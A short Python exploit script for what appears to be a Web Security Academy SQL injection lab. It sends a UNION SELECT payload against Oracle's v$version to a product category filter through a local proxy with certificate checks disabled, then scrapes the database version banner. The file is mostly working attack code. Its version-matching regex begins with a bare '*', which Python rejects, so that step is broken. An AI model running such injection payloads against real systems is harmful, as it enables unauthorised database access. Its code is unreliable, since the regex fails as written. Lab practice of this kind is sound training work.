''' Lab07: SQLi

url = "https://acb91fde1ec22bf4c0654c70002a007c.web-security-academy.net"
path = "/filter?category=Gifts"
sql_payload = ' UNION SELECT null, banner FROM v$version--
'''

import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_version(url):
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner, NULL FROM v$version--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "Oracle Database" in res:
        print("Found the database version.")
        soup = BeautifulSoup(res, 'html.parser')
        my_regex = re.compile('*.Oracle\sDatabase.*')
        version = soup.find(text=my_regex)
        print("The database version is: ", version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        exit(-1)  # exits program because we didn't run it correctly
    print("Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("The database version was not found")
